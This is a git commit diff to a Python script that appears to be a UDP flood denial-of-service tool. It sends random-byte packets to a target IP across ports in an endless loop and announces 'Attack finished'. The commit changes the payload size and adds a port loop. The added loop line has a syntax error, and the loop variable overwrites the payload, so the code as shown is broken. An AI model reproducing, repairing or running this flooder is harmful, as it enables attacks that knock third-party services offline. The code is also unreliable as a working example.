13ccafa4ea2a51f19453b6943ead95bf59845955
Revamp-MTT <132065512+Revamp-MTT@users.noreply.github.com>
2023-05-03 12:22:47 +0700

    Update RevampMTT343.py

--- RevampMTT343.py
+++ RevampMTT343.py
@@ -9,7 +9,7 @@ R = '\033[31m'
 N = '\033[0m'
 
 white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(35531)
+bytes = random._urandom(31230)
 
 os.system("clear")
 print(" ")
@@ -42,8 +42,11 @@ time.sleep(3)
 while True:
     sent = 0
     for bytes in range(1, 65534):
+    for port in range(1, 65534)
         white.sendto(bytes, (ip, port))
         sent = sent + 1
+        port = port + 1
+        
         print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))
 
 print("\033[1;92mAttack finished\033[0m")
